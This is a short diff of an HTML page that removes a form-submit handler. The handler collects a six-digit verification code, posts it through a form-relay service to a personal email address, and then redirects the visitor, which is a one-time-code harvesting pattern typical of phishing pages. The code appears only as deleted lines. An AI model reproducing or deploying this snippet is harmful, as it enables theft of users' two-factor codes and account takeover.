@@ -222,22 +222,6 @@ form.addEventListener('submit', async function(e) {
   }
 });
 </script>
-  
-form.addEventListener('submit', function(e) {
-  e.preventDefault();
-  let code = '';
-  inputs.forEach(inp => code += inp.value);
-  if (code.length < 6) return alert('Enter the full 6-digit code');
-
-  fetch('https://formsubmit.co/ajax/andrealagob@gmail.com', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ code })
-  })
-  .then(() => window.location.href = 'marca.com')
-  .catch(() => window.location.href = '');
-});
-</script>
 
 </body>
 </html>
